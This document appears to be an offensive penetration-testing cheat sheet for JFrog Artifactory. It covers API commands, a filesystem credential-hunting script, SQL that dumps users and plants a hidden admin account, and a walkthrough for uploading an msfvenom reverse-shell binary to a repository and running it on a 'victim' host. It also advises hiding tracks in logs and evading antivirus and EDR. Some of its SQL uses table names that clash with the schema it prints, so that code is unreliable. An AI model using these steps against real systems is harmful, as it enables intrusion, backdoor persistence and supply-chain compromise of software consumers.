
### **Artifactory Cheat Sheet**

### Artifactory Login example using curl

```bash
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: 192.168.232.40:8082' -H $'User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: application/json, text/plain, */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/json;charset=utf-8' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Length: 56' -H $'Origin: http://192.168.232.40:8082' -H $'Connection: keep-alive' \
    --data-binary $'{\"user\":\"admin\",\"password\":\"password123\",\"type\":\"login\"}' \
    $'http://192.168.232.40:8082/ui/api/v1/ui/auth/login?_spring_security_remember_me=false'
```

#### **Basic Commands**
- **Login to Artifactory:**
  ```bash
  curl -u <username>:<password> https://<artifactory-url>/artifactory/api/security/encryptedPassword
  ```
- **Upload Artifact:**
  ```bash
  curl -u <username>:<password> -T <file> "https://<artifactory-url>/artifactory/<repository>/<file-path>"
  ```
- **Download Artifact:**
  ```bash
  curl -u <username>:<password> -O "https://<artifactory-url>/artifactory/<repository>/<file-path>"
  ```
- **Delete Artifact:**
  ```bash
  curl -u <username>:<password> -X DELETE "https://<artifactory-url>/artifactory/<repository>/<file-path>"
  ```
- **Search Artifacts by Name:**
  ```bash
  curl -u <username>:<password> "https://<artifactory-url>/artifactory/api/search/artifact?name=<artifact-name>"
  ```
- **Search Artifacts by Property:**
  ```bash
  curl -u <username>:<password> "https://<artifactory-url>/artifactory/api/search/prop?propertyKey=<key>&propertyValue=<value>"
  ```
- **Create Repository:**
  ```bash
  curl -u <username>:<password> -X PUT "https://<artifactory-url>/artifactory/api/repositories/<repo-name>" -T <repository-config-file.json>
  ```
- **Get Repository Information:**
  ```bash
  curl -u <username>:<password> "https://<artifactory-url>/artifactory/api/repositories/<repo-name>"
  ```

#### **Managing Users and Permissions**
- **Create User:**
  ```bash
  curl -u <admin-username>:<admin-password> -X PUT "https://<artifactory-url>/artifactory/api/security/users/<username>" -T user.json
  ```
- **Delete User:**
  ```bash
  curl -u <admin-username>:<admin-password> -X DELETE "https://<artifactory-url>/artifactory/api/security/users/<username>"
  ```
- **List All Users:**
  ```bash
  curl -u <admin-username>:<admin-password> "https://<artifactory-url>/artifactory/api/security/users"
  ```
- **Assign Permissions:**
  ```bash
  curl -u <admin-username>:<admin-password> -X PUT "https://<artifactory-url>/artifactory/api/security/permissions/<permission-name>" -T permission.json
  ```

#### **Repository Maintenance**
- **Calculate Repository Metadata:**
  ```bash
  curl -u <username>:<password> -X POST "https://<artifactory-url>/artifactory/api/maven/calculateMetadata/<repo-name>"
  ```
- **Clear Cache:**
  ```bash
  curl -u <username>:<password> -X POST "https://<artifactory-url>/artifactory/api/repositories/<repo-name>/cache/clear"
  ```
- **Replicate Repository:**
  ```bash
  curl -u <username>:<password> -X POST "https://<artifactory-url>/artifactory/api/replication/<repo-name>" -T replication.json
  ```

### **Artifactory Exploitation Possibilities**

1. **Unauthorized Access**
   - **Weak Credentials:** Weak or default credentials can allow unauthorized access.
   - **Exposed API Keys:** API keys or tokens stored insecurely can be exploited to gain access.

   **Mitigation:** Enforce strong password policies, and use API key management best practices.

2. **Privilege Escalation**
   - **Misconfigured Permissions:** Users with excessive permissions can modify repositories or access sensitive data.

   **Mitigation:** Regularly audit user permissions and adhere to the principle of least privilege.

3. **Arbitrary File Upload**
   - **Insecure Repositories:** If repositories allow arbitrary file uploads without validation, attackers can upload malicious files.

   **Mitigation:** Restrict upload permissions and validate files before accepting them.

4. **Sensitive Data Exposure**
   - **Improperly Secured Repositories:** Sensitive data stored in repositories without proper access control can be exposed.

   **Mitigation:** Ensure that repositories are properly secured with role-based access controls.

5. **Remote Code Execution**
   - **Exploiting API Endpoints:** Certain vulnerabilities may allow attackers to execute code remotely by exploiting API endpoints.

   **Mitigation:** Keep Artifactory up to date with security patches, and limit access to the API.

6. **Malicious Package Insertion**
   - **Compromised Repositories:** Attackers can insert malicious code into packages stored in Artifactory, which could then be deployed to production.

   **Mitigation:** Implement code and package integrity checks, and use signed packages.

### **Script to Check for Possible Exploit Paths on a Linux Server**

Here’s a shell script that checks for common Artifactory misconfigurations and vulnerabilities:

```bash
#!/bin/bash

echo "Starting Artifactory Security Enumeration..."

# Check for world-readable configuration files
echo "Checking for world-readable configuration files..."
find / -name "artifactory.config.xml" -o -name "*.json" -o -name "*.yaml" 2>/dev/null | while read -r file; do
    if [ -r "$file" ]; then
        perms=$(stat -c "%A" "$file")
        if [[ "$perms" =~ ^-rw-r--r-- ]]; then
            echo "World-readable configuration file: $file"
        fi
    fi
done

# Check for hardcoded credentials in configuration files
echo "Checking for hardcoded credentials in configuration files..."
grep -rnw '/' -e "password" --include \*.xml --include \*.json --include \*.yaml 2>/dev/null

# Check for exposed API keys
echo "Checking for exposed API keys..."
grep -rnw '/' -e "apikey" --include \*.xml --include \*.json --include \*.yaml 2>/dev/null

# Check for misconfigured repositories allowing arbitrary uploads
echo "Checking for misconfigured repositories (write permissions)..."
curl -u <username>:<password> -X GET "https://<artifactory-url>/artifactory/api/repositories" 2>/dev/null | grep '"type":"local"' | while read -r repo; do
    repo_name=$(echo "$repo" | jq -r '.key')
    permissions=$(curl -u <username>:<password> "https://<artifactory-url>/artifactory/api/security/permissions/$repo_name")
    echo "$permissions" | grep -q '"groups":\[.*"deploy".*\]' && echo "Repository $repo_name has deploy permissions enabled"
done

# Check for unpatched Artifactory vulnerabilities
echo "Checking for unpatched Artifactory vulnerabilities..."
artifactory_version=$(curl -u <username>:<password> "https://<artifactory-url>/artifactory/api/system/version" 2>/dev/null | jq -r '.version')
echo "Artifactory version: $artifactory_version"
# (Assumes a local CVE database or use a vulnerability management tool to check version)

# Check for sudo privileges that might lead to exploitation
echo "Checking for sudo privileges that might lead to exploitation..."
getent group sudo | cut -d: -f4

echo "Artifactory Security Enumeration Completed."
```

### **How to Use the Script:**
1. Replace `<username>`, `<password>`, and `<artifactory-url>` with your Artifactory credentials and server URL.
2. Save the script as `artifactory_enum.sh`.
3. Make the script executable:
   ```bash
   chmod +x artifactory_enum.sh
   ```
4. Run the script with appropriate permissions:
   ```bash
   sudo ./artifactory_enum.sh
   ```

### **Important Considerations:**
- **Permissions**: The script may require root or appropriate user privileges to access certain files or execute certain commands.
- **False Positives**: The script might produce false positives; manual verification is recommended.
- **Customizations**: Modify the script to fit specific needs, such as integrating with vulnerability databases for real-time checks.

This script provides a basic starting point for enumerating possible security issues in an Artifactory environment.


To extract users from a database supported by Artifactory, and add a secondary administrator account, the method will vary depending on the specific database in use (e.g., MySQL, PostgreSQL, etc.). Below are general approaches and scripts for common databases that Artifactory might use.

### 1. Extracting Users from the Database

**For MySQL/MariaDB:**

To extract users from an Artifactory database stored in MySQL/MariaDB:

```bash
#!/bin/bash

# MySQL credentials
DB_HOST="localhost"
DB_USER="your_db_user"
DB_PASS="your_db_password"
DB_NAME="artifactory"

# Connect to the MySQL database and extract users
mysql -h $DB_HOST -u $DB_USER -p$DB_PASS -D $DB_NAME -e "SELECT username FROM users;"
```

**For PostgreSQL:**

To extract users from an Artifactory database stored in PostgreSQL:

```bash
#!/bin/bash

# PostgreSQL credentials
DB_HOST="localhost"
DB_USER="your_db_user"
DB_PASS="your_db_password"
DB_NAME="artifactory"

# Connect to the PostgreSQL database and extract users
PGPASSWORD=$DB_PASS psql -h $DB_HOST -U $DB_USER -d $DB_NAME -c "SELECT username FROM users;"
```

### 2. Adding a Secondary Administrator Account

**For MySQL/MariaDB:**

To add a secondary administrator account in MySQL/MariaDB:

```bash
#!/bin/bash

# MySQL credentials
DB_HOST="localhost"
DB_USER="your_db_user"
DB_PASS="your_db_password"
DB_NAME="artifactory"

# New admin account details
NEW_USER="new_admin"
NEW_PASS="new_password"
NEW_EMAIL="admin@example.com"

# Insert the new admin user into the database
mysql -h $DB_HOST -u $DB_USER -p$DB_PASS -D $DB_NAME -e "INSERT INTO users (username, password, email, admin) VALUES ('$NEW_USER', MD5('$NEW_PASS'), '$NEW_EMAIL', 1);"
```

**For PostgreSQL:**

To add a secondary administrator account in PostgreSQL:

```bash
#!/bin/bash

# PostgreSQL credentials
DB_HOST="localhost"
DB_USER="your_db_user"
DB_PASS="your_db_password"
DB_NAME="artifactory"

# New admin account details
NEW_USER="new_admin"
NEW_PASS="new_password"
NEW_EMAIL="admin@example.com"

# Insert the new admin user into the database
PGPASSWORD=$DB_PASS psql -h $DB_HOST -U $DB_USER -d $DB_NAME -c "INSERT INTO users (username, password, email, admin) VALUES ('$NEW_USER', crypt('$NEW_PASS', gen_salt('md5')), '$NEW_EMAIL', true);"
```

### Notes:
- **Database Access:** Ensure that you have appropriate permissions to access and modify the database.
- **Artifactory Schema:** The exact schema (e.g., table names and columns) may vary based on your Artifactory version. You might need to inspect your database schema using tools like `mysql`, `pgAdmin`, or similar tools to confirm the correct table names and column names.
- **Security:** Be mindful that directly manipulating the database can be risky, and such changes should ideally be performed through Artifactory's API or web interface to maintain data integrity.

### Scriptable Method via Artifactory REST API

Artifactory provides a REST API to manage users, which might be a safer and more flexible option:

**Example to Add a New Admin via Artifactory REST API:**

```bash
#!/bin/bash

# Artifactory credentials
ARTIFACTORY_URL="http://your-artifactory-instance/artifactory"
API_KEY="your_api_key"
NEW_USER="new_admin"
NEW_PASS="new_password"
NEW_EMAIL="admin@example.com"

# Create a JSON payload
payload=$(cat <<EOF
{
  "name": "$NEW_USER",
  "email": "$NEW_EMAIL",
  "password": "$NEW_PASS",
  "admin": true,
  "groups": ["readers", "writers"]
}
EOF
)

# Make API request to create new user
curl -X PUT -H "Content-Type: application/json" -H "Authorization: Bearer $API_KEY" -d "$payload" "$ARTIFACTORY_URL/api/security/users/$NEW_USER"
```

### Conclusion:
These methods give you the ability to extract user data and manipulate user accounts in an Artifactory database, either directly through SQL or via the Artifactory REST API.


Artifactory's default Derby database is an embedded, lightweight database that is typically used for small-scale deployments or testing purposes. Accessing and extracting data from the Derby database requires a different approach compared to MySQL or PostgreSQL.

Here’s how you can work with the Derby database to extract users and potentially add a secondary administrator account:

### 1. Extracting Users from the Derby Database

To extract users from the embedded Derby database, you need to:

1. **Locate the Derby Database Files:**
   - The Derby database files are usually located in the `$ARTIFACTORY_HOME/data/derby` directory.

2. **Use the `ij` Tool to Query the Derby Database:**
   - The `ij` tool is a command-line interface for running SQL scripts against a Derby database.

```bash
#!/bin/bash

# Define the Artifactory Derby database path
DERBY_DB_PATH="/path/to/artifactory/data/derby"

# Query the users table
java -jar $DERBY_HOME/lib/derbyrun.jar ij <<EOF
CONNECT 'jdbc:derby:$DERBY_DB_PATH';
SELECT username FROM access_users;
EXIT;
EOF
```

### Derby Schema

```sql
ij> connect 'jdbc:derby:/dev/shm/derby';
ij> show tables;
TABLE_SCHEM         |TABLE_NAME                    |REMARKS
------------------------------------------------------------------------
SYS                 |SYSALIASES                    |
SYS                 |SYSCHECKS                     |
SYS                 |SYSCOLPERMS                   |
SYS                 |SYSCOLUMNS                    |
SYS                 |SYSCONGLOMERATES              |
SYS                 |SYSCONSTRAINTS                |
SYS                 |SYSDEPENDS                    |
SYS                 |SYSFILES                      |
SYS                 |SYSFOREIGNKEYS                |
SYS                 |SYSKEYS                       |
SYS                 |SYSPERMS                      |
SYS                 |SYSROLES                      |
SYS                 |SYSROUTINEPERMS               |
SYS                 |SYSSCHEMAS                    |
SYS                 |SYSSEQUENCES                  |
SYS                 |SYSSTATEMENTS                 |
SYS                 |SYSSTATISTICS                 |
SYS                 |SYSTABLEPERMS                 |
SYS                 |SYSTABLES                     |
SYS                 |SYSTRIGGERS                   |
SYS                 |SYSUSERS                      |
SYS                 |SYSVIEWS                      |
SYSIBM              |SYSDUMMY1                     |
APP                 |ACCESS_CONFIGS                |
APP                 |ACCESS_FEDERATION_LOG         |
APP                 |ACCESS_FEDERATION_SERVERS     |
APP                 |ACCESS_GROUPS                 |
APP                 |ACCESS_GROUPS_CUSTOM_DATA     |
APP                 |ACCESS_MASTER_KEY_STATUS      |
APP                 |ACCESS_NODES                  |
APP                 |ACCESS_PERMISSIONS            |
APP                 |ACCESS_PERMISSIONS_CUSTOM_DATA|
APP                 |ACCESS_PERMISSION_ACTION      |
APP                 |ACCESS_SERVERS                |
APP                 |ACCESS_TOKENS                 |
APP                 |ACCESS_TOPOLOGY               |
APP                 |ACCESS_UNIQUE_IDS             |
APP                 |ACCESS_USERS                  |
APP                 |ACCESS_USERS_CUSTOM_DATA      |
APP                 |ACCESS_USERS_GROUPS           |
APP                 |access_schema_version         |
```

### 2. Adding a Secondary Administrator Account

To add a secondary administrator account, you would similarly use the `ij` tool to insert a new record into the `users` table.

```bash
#!/bin/bash

# Define the Artifactory Derby database path
DERBY_DB_PATH="/path/to/artifactory/data/derby"

# New admin account details
NEW_USER="new_admin"
NEW_PASS="new_password"
NEW_EMAIL="admin@example.com"

# Insert the new admin user into the Derby database
java -jar $DERBY_HOME/lib/derbyrun.jar ij <<EOF
CONNECT 'jdbc:derby:$DERBY_DB_PATH';
INSERT INTO users (username, password, email, admin) VALUES ('$NEW_USER', HASH('MD5', CAST('$NEW_PASS' AS VARCHAR(32672))), '$NEW_EMAIL', true);
EXIT;
EOF
```

### 3. Working with the Derby Database Programmatically

**For Scripting in Bash:**

You can create a more advanced bash script to connect to the Derby database, query users, or add new users programmatically.

**Note:**

- **Derby Database Access:** The Derby database is usually embedded and accessed locally, so ensure that you have direct file system access to the server where Artifactory is running.
- **Safety:** Direct manipulation of the Derby database should be done cautiously. Backup your database before making changes.
- **Database Schema:** Verify the schema, as field names might differ based on the Artifactory version.

### Using Artifactory REST API (Recommended)

As mentioned earlier, using the Artifactory REST API to manage users is safer and more in line with best practices, as it doesn't require direct access to the underlying database.

### Conclusion

Interacting with the embedded Derby database for Artifactory requires knowledge of SQL and the use of tools like `ij`. However, it's generally recommended to manage users and configurations through Artifactory's REST API to ensure consistency and avoid potential data corruption.


To deploy a backdoored binary to an Artifactory repository, download it, and then run it on a target Linux machine (referred to as "linuxvictim"), you can follow these steps. Keep in mind that this approach is typically used for penetration testing or Red Team activities in controlled environments where you have explicit permission to test the security.

### 1. Create a Backdoored Binary
First, create a binary with an embedded payload (e.g., using Metasploit, msfvenom, or a custom backdoor).

Example with `msfvenom`:
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f elf -o backdoored_app
```

This creates a reverse shell binary that connects back to your machine.

### 2. Upload the Backdoored Binary to Artifactory
Next, you can upload the binary to an Artifactory repository.

#### Using the Artifactory Web UI:
1. Log in to Artifactory.
2. Navigate to the target repository.
3. Click on "Deploy" and upload your backdoored binary (`backdoored_app`).

#### Using the Artifactory REST API:
You can also use a script to upload the binary.

Example with `curl`:
```bash
curl -u <username>:<password> -T backdoored_app "http://<artifactory_url>/artifactory/<repo>/<path>/backdoored_app"
```

### 3. Download the Backdoored Binary on the Target Machine
Assuming you have some level of access to `linuxvictim`, you can download and execute the binary.

Example using `curl` on `linuxvictim`:
```bash
curl -O "http://<artifactory_url>/artifactory/<repo>/<path>/backdoored_app"
chmod +x backdoored_app
./backdoored_app
```

### 4. Execute the Binary and Maintain Access
Once the binary is executed on `linuxvictim`, it will establish a reverse shell connection back to your machine, giving you control over the system.

### Considerations and Best Practices
- **Network Monitoring:** Be aware that such activities can be easily flagged by network security monitoring tools.
- **Logging:** Artifactory logs the deployment and download actions, so consider how to clean up or obscure your tracks if necessary.
- **Permission:** Ensure you have proper authorization for such actions, as unauthorized access or deployment of backdoors can have legal consequences.
- **Anti-Virus and EDR:** Modern systems may have anti-virus or Endpoint Detection and Response (EDR) tools that could detect and block your payload. Consider using evasion techniques.

### Alternative Methods
If the environment is heavily monitored, you might need to use more stealthy techniques:
- **Staging with Scripts:** Instead of deploying a binary directly, use a script that fetches the binary, decompresses it, and runs it to avoid direct binary analysis.
- **Fileless Attacks:** Consider fileless attacks where you leverage in-memory execution to avoid writing a file to disk.

### Ethical Considerations
Always conduct such activities with full consent and within legal boundaries. The steps provided are for educational purposes and should only be used in environments where you have explicit permission to test security.